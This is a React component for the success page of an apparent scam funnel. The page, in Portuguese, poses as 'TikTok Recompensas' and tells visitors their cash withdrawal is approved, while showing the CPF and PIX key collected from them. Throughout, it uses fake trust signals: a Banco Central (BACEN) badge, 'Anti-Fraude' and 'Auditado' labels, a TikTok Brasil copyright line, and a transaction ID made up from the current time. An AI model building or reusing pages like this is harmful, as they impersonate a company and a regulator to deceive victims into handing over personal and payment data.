import { useLocation, Link } from "react-router-dom";
import { CheckCircle, Shield, Clock, Music2, Sparkles, Lock, FileCheck, BadgeCheck, ShieldCheck } from "lucide-react";
import bacenLogo from "@/assets/bacen-logo.png";
import tiktokLogo from "@/assets/tiktok-logo.png";
import tiktokIcon from "@/assets/tiktok-icon.png";
import { useLeadData } from "@/hooks/useLeadData";

interface LocationState {
  pixKey?: string;
  pixKeyType?: string;
}

const formatCpf = (cpf: string) => {
  const digits = cpf.replace(/\D/g, "");
  if (digits.length !== 11) return cpf;
  return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
};

const FunnelSuccessPage = () => {
  const location = useLocation();
  const state = location.state as LocationState | null;
  const pixKey = state?.pixKey || "Não informada";
  const pixKeyType = state?.pixKeyType || "Chave PIX";
  const { leadCpf, leadName } = useLeadData();

  const firstName = leadName ? leadName.split(" ")[0] : "";

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      {/* Floating TikTok notes decoration */}
      <div className="absolute top-20 left-4 opacity-10 animate-bounce" style={{ animationDelay: "0s", animationDuration: "3s" }}>
        <Music2 className="w-8 h-8 text-[#25F4EE]/40" />
      </div>
      <div className="absolute top-40 right-6 opacity-10 animate-bounce" style={{ animationDelay: "0.5s", animationDuration: "2.5s" }}>
        <Music2 className="w-6 h-6 text-[#FE2C55]/40" />
      </div>
      <div className="absolute top-72 left-8 opacity-10 animate-bounce" style={{ animationDelay: "1s", animationDuration: "3.5s" }}>
        <Music2 className="w-5 h-5 text-gray-300" />
      </div>
      <div className="absolute bottom-40 right-4 opacity-10 animate-bounce" style={{ animationDelay: "1.5s", animationDuration: "2.8s" }}>
        <Music2 className="w-7 h-7 text-[#25F4EE]/40" />
      </div>
      <div className="absolute bottom-60 left-6 opacity-10 animate-bounce" style={{ animationDelay: "0.8s", animationDuration: "3.2s" }}>
        <Sparkles className="w-5 h-5 text-[#FE2C55]/40" />
      </div>

      {/* Header */}
      <div className="bg-gray-800 py-4 px-4 flex items-center justify-center gap-2">
        <img src={tiktokIcon} alt="TikTok" className="h-8" />
        <span className="text-white font-bold text-lg tracking-tight">TikTok Recompensas</span>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 relative z-10">
        {/* Glow effect behind card */}
        <div className="absolute w-72 h-72 rounded-full bg-[#25F4EE]/5 blur-[100px] top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 pointer-events-none" />

        <div className="bg-white rounded-2xl shadow-lg p-6 max-w-md w-full text-center border border-gray-100 relative">
          {/* Subtle top bar */}
          <div className="absolute top-0 left-0 right-0 h-1 rounded-t-2xl bg-gradient-to-r from-gray-300 via-gray-400 to-gray-300" />

          {/* Success Icon with TikTok colors */}
          <div className="relative w-20 h-20 mx-auto mb-4">
            <div className="absolute inset-0 bg-green-200/40 rounded-full animate-ping" style={{ animationDuration: "2s" }} />
            <div className="relative w-20 h-20 bg-gradient-to-br from-green-400 to-green-500 rounded-full flex items-center justify-center">
              <CheckCircle className="w-12 h-12 text-white" />
            </div>
          </div>

          {/* Greeting */}
          <h1 className="text-2xl font-black text-gray-900 mb-1">
            {firstName ? `Parabéns, ${firstName}! 🎉` : "Parabéns! 🎉"}
          </h1>
          <p className="text-green-600 font-bold text-lg mb-4">
            Seu saque foi aprovado e liberado!
          </p>

          {/* CPF Identification */}
          {leadCpf && (
            <div className="bg-gray-50 border border-gray-200 rounded-lg p-3 mb-4">
              <p className="text-xs text-gray-500 mb-0.5">CPF Verificado</p>
              <p className="text-sm font-semibold text-gray-800 flex items-center justify-center gap-1.5">
                <Shield className="w-4 h-4 text-green-500" />
                {formatCpf(leadCpf)}
              </p>
            </div>
          )}

          {/* PIX Key Display */}
          <div className="bg-green-50 border border-green-100 rounded-lg p-4 mb-4">
            <p className="text-xs text-green-700 mb-1 font-bold">💰 Valor será enviado para:</p>
            <p className="text-xs text-gray-500 mb-0.5">{pixKeyType}</p>
            <p className="text-base font-bold text-gray-900 break-all">{pixKey}</p>
          </div>

          {/* Timeline */}
          <div className="bg-amber-50 border border-amber-100 rounded-lg p-3 mb-4">
            <div className="flex items-center justify-center gap-2">
              <Clock className="w-4 h-4 text-amber-500" />
              <p className="text-gray-800 text-sm font-medium">
                Prazo: <strong>até 24 horas úteis</strong>
              </p>
            </div>
            <p className="text-gray-500 text-xs mt-1">
              A maioria dos saques é processada em menos de 2 horas
            </p>
          </div>

          {/* Trust badges - expanded */}
          <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
            <p className="text-xs text-gray-500 font-semibold mb-3 uppercase tracking-wide">Certificações de Segurança</p>
            <div className="grid grid-cols-2 gap-3">
              <div className="flex items-center gap-2 bg-white rounded-md p-2 border border-gray-100">
                <ShieldCheck className="w-5 h-5 text-green-500 shrink-0" />
                <div className="text-left">
                  <p className="text-xs font-semibold text-gray-800">SSL Ativo</p>
                  <p className="text-[10px] text-gray-400">Conexão criptografada</p>
                </div>
              </div>
              <div className="flex items-center gap-2 bg-white rounded-md p-2 border border-gray-100">
                <img src={bacenLogo} alt="BACEN" className="w-5 h-5 shrink-0 object-contain" />
                <div className="text-left">
                  <p className="text-xs font-semibold text-gray-800">BACEN</p>
                  <p className="text-[10px] text-gray-400">Banco Central</p>
                </div>
              </div>
              <div className="flex items-center gap-2 bg-white rounded-md p-2 border border-gray-100">
                <Lock className="w-5 h-5 text-green-500 shrink-0" />
                <div className="text-left">
                  <p className="text-xs font-semibold text-gray-800">Anti-Fraude</p>
                  <p className="text-[10px] text-gray-400">Proteção ativa</p>
                </div>
              </div>
              <div className="flex items-center gap-2 bg-white rounded-md p-2 border border-gray-100">
                <FileCheck className="w-5 h-5 text-green-500 shrink-0" />
                <div className="text-left">
                  <p className="text-xs font-semibold text-gray-800">Auditado</p>
                  <p className="text-[10px] text-gray-400">Processo verificado</p>
                </div>
              </div>
            </div>
          </div>

          {/* Transaction ID */}
          <div className="flex items-center justify-center gap-2 mb-4 text-xs text-gray-400">
            <BadgeCheck className="w-3.5 h-3.5" />
            <span>ID: TK-{Date.now().toString(36).toUpperCase()}</span>
            <span>•</span>
            <span>{new Date().toLocaleDateString("pt-BR")}</span>
          </div>

          {/* CTA */}
          <Link
            to="/"
            className="block w-full bg-gray-800 text-white font-bold py-4 rounded-xl hover:bg-gray-700 transition-colors text-sm"
          >
            VOLTAR AO INÍCIO
          </Link>
        </div>
      </div>

      {/* Footer */}
      <div className="bg-gray-100 py-4 text-center relative z-10">
        <div className="flex items-center justify-center gap-1.5 mb-1">
          <img src={tiktokLogo} alt="TikTok" className="h-3.5 opacity-50" />
          <p className="text-gray-500 text-xs">
            © {new Date().getFullYear()} TikTok Brasil. Todos os direitos reservados.
          </p>
        </div>
      </div>
    </div>
  );
};

export default FunnelSuccessPage;
